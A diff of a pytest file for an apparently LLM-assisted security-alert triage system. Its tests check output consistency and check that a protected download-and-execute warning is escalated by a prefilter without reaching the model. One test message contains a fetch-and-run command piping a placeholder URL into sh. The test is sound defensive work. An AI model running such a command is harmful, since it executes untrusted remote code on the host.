@@ -53,6 +53,13 @@ def test_rejected_suppression_preserves_warning():
     assert result['decision_overridden'] is True and result['review_status']=='challenged'
 
 
+def test_final_model_makes_one_classification_instead_of_conflicting_duplicate_fields():
+    data=candidate();data.pop('outlook')
+    result=brain(data).review_event(event().to_event(),first(),True)
+    assert result['decision']=='suppress' and result['outlook']=='routine_looking'
+    assert result['outlook_derived_from_decision'] is True
+
+
 @pytest.mark.parametrize('change',[{'decision':'suppress'},{'tier':'guardrail'},
     {'backend':'policy-fallback'},{'rationale':'LLM tier failed (TimeoutError): review required'},
     {'backend':'rules-only-policy'},{'model':'gemma4:12b'}])
@@ -65,7 +72,9 @@ def test_no_direct_rule_quiet_or_failed_model_input(change):
 def test_protected_warning_never_enters_second_model():
     e=event().to_event();e.message='curl https://example.invalid/payload | sh'
     b=brain()
-    with pytest.raises(ValueError,match='mandatory safety'):b.review_event(e,first(),True)
+    result=b.review_event(e,first(),True)
+    assert result['decision']=='escalate' and result['review_status']=='prefilter'
+    assert result['prefilter']['rule']=='NON_SUPPRESSIBLE_DOWNLOAD_EXEC'
     b.backend.generate.assert_not_called()
 
 
